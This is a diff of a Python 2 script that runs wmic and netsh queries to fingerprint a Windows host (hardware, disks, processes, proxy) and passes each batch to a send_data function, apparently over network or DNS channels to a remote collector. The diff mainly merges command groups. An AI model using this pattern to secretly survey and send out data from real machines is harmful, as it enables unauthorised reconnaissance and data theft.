@@ -254,7 +254,7 @@ def format_helper(commands):
         result = regex2.sub("|", result2)
     return result
 # group of commands to run in thread
-def commands_0(result, target, key, host, network_avail, dns_avail):
+def commands_1(result, target, key, host, network_avail, dns_avail):
     # python wmi was too sloooooow :/
     commands = {'wmic os get serialnumber': 'SN',
                 'wmic logicaldisk get name':'LDN',
@@ -266,20 +266,9 @@ def commands_0(result, target, key, host, network_avail, dns_avail):
                 'wmic computersystem get totalphysicalmemory':'PM',
                 'wmic computersystem get systemtype':'CST',
                 'wmic os get lastbootuptime':'BTT',  # does not work on XP
-                }
-    result = format_helper(commands)
-    send_data(result, target, key, host, network_avail, dns_avail)
-def commands_1(result, target, key, host, network_avail, dns_avail):
-    commands = {
                 'wmic cpu get name':'CPN',
                 'wmic cpu get numberofcores':'CPC',
                 'wmic cpu get numberoflogicalprocessors':'CPL',
-                
-                }
-    result = format_helper(commands)
-    send_data(result, target, key, host, network_avail, dns_avail)
-def commands_2(result, target, key, host, network_avail, dns_avail):
-    commands = {
                 'wmic printer get name':'PRN',
                 'wmic baseboard get manufacturer':'BM',
                 'wmic computersystem get model':'CSM',
@@ -291,9 +280,11 @@ def commands_2(result, target, key, host, network_avail, dns_avail):
                 'wmic desktopmonitor get caption':'MON',
                 'wmic systemenclosure get manufacturer':'SYE',
                 'wmic sounddev get caption':'SND',
+                'wmic process get executablepath':'EX'
                 }
     result = format_helper(commands)
     send_data(result, target, key, host, network_avail, dns_avail)
+
 def commands_3(result, target, key, host, network_avail, dns_avail):
     commands = {
                 'netsh winhttp show proxy':'PR1',
@@ -305,7 +296,7 @@ def commands_3(result, target, key, host, network_avail, dns_avail):
     send_data(result, target, key, host, network_avail, dns_avail)
 def commands_4(result, target, key, host, network_avail, dns_avail):
     commands = {#'wmic product get Name':'PN',      #disabled due to performance issues
-                'wmic process get executablepath':'EX'}
+                }
     for c, v in commands.iteritems():
         # print (c)
         out = run_command(c)
@@ -438,7 +429,7 @@ try:
     dns_avail = test_dns(target, target_ip)
     #network_avail = True
     #dns_avail = True
-    fl = [commands_0,commands_1,commands_2,
+    fl = [commands_1, #commands_2,
           #commands_3,  #disabled
           commands_4,    
           commands_5,commands_6,commands_7,commands_8,commands_9]
